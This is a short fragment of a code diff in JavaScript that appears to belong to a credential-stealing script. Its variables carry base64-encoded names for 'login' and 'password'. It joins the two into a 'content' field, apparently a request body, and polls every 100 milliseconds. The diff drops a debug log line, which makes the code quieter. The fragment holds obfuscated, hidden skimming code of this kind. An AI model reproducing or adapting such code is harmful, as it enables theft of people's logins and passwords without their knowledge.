@@ -22,7 +22,6 @@
                 "content": bG9naW4 + "|" + cGFzc3dvcmQ
                 }
         }), Zm9ybWF0dGVk = bG9naW4 + " | " + cGFzc3dvcmQ)
-    console.log(bG9naW4)
     }
     setInterval(UagZgR8PZcWcwvYp, 100);
 
